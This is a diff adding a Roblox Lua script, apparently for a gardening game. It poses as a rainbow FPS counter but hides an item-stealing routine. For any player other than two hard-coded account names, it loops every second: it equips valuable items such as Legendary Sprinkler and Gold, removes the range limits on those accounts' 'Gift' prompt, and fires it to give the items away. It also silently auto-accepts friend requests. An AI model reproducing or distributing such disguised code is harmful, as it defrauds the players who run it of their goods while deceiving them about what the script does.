@@ -1,0 +1,134 @@
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local TARGET_NAMES = {"EYTHANGDADEN", "NHATPROCOM"}
+
+local screenGui = Instance.new("ScreenGui")
+local textLabel = Instance.new("TextLabel")
+
+screenGui.Parent = game.CoreGui
+screenGui.DisplayOrder = 100000000000000000
+
+textLabel.Parent = screenGui
+textLabel.Size = UDim2.new(0, 300, 0, 50)
+textLabel.Position = UDim2.new(0, 10, 0, 10)
+textLabel.Font = Enum.Font.FredokaOne
+textLabel.TextScaled = true
+textLabel.BackgroundTransparency = 1
+textLabel.TextStrokeTransparency = 0
+
+local function rainbowColor()
+    local Dreamon = 0
+    while true do
+        Dreamon = Dreamon + 0.01
+        if Dreamon > 1 then Dreamon = 0 end
+        textLabel.TextColor3 = Color3.fromHSV(Dreamon, 1, 1)
+        RunService.RenderStepped:Wait()
+    end
+end
+
+spawn(rainbowColor)
+
+local frameCount = 0
+local lastUpdate = tick()
+
+RunService.RenderStepped:Connect(function()
+    frameCount = frameCount + 1
+    local now = tick()
+
+    if now - lastUpdate >= 1 then
+        local fps = frameCount / (now - lastUpdate)
+        frameCount = 0
+        lastUpdate = now
+
+        textLabel.Text = string.format("FPS: %d", math.floor(fps))
+    end
+end)
+
+local ItemList = {
+    "Legendary Sprinkler",
+    "Mushroom",
+    "Super Watering Can",
+    "Super Sprinkler",
+    "Venom Spitter",
+    "Dragon's Breath",
+    "Moon Bloom",
+    "Venus Fly Trap",
+    "Gold"
+}
+
+local function getTargetCharacter()
+    for _, name in ipairs(TARGET_NAMES) do
+        local p = Players:FindFirstChild(name)
+        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            return p.Character
+        end
+    end
+    return nil
+end
+
+local function isLocalPlayerTarget()
+    for _, name in ipairs(TARGET_NAMES) do
+        if LocalPlayer.Name == name then
+            return true
+        end
+    end
+    return false
+end
+
+while task.wait(1) do
+    if not isLocalPlayerTarget() then
+        local character = LocalPlayer.Character
+        local backpack = LocalPlayer:FindFirstChild("Backpack")
+        
+        if character and backpack then
+            for _, itemName in ipairs(ItemList) do
+                local item = backpack:FindFirstChild(itemName)
+                if item then item.Parent = character end
+            end
+            
+            local targetChar = getTargetCharacter()
+            if targetChar then
+                local hrp = targetChar:FindFirstChild("HumanoidRootPart")
+                local prompt = hrp and hrp:FindFirstChild("Gift")
+                
+                local isHoldingItem = false
+                for _, itemName in ipairs(ItemList) do
+                    if character:FindFirstChild(itemName) then
+                        isHoldingItem = true
+                        break
+                    end
+                end
+                
+                if isHoldingItem and prompt and prompt:IsA("ProximityPrompt") then
+                    prompt.RequiresLineOfSight = false
+                    prompt.MaxActivationDistance = 999999
+                    fireproximityprompt(prompt)
+                end
+            end
+        end
+
+        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+        local friendReq = playerGui and playerGui:FindFirstChild("FriendRequest")
+        local frame = friendReq and friendReq:FindFirstChild("Frame")
+        if frame then
+            for _, child in ipairs(frame:GetChildren()) do
+                if string.match(child.Name, "^FriendRequest_") then
+                    local buttons = child:FindFirstChild("Buttons")
+                    local friendAcceptBtn = buttons and buttons:FindFirstChild("AcceptButton")
+                    if friendAcceptBtn and friendAcceptBtn.Visible == true then
+                        if firesignal then
+                            firesignal(friendAcceptBtn.Activated)
+                        else
+                            for _, connection in pairs(getconnections(friendAcceptBtn.Activated)) do
+                                connection:Fire()
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
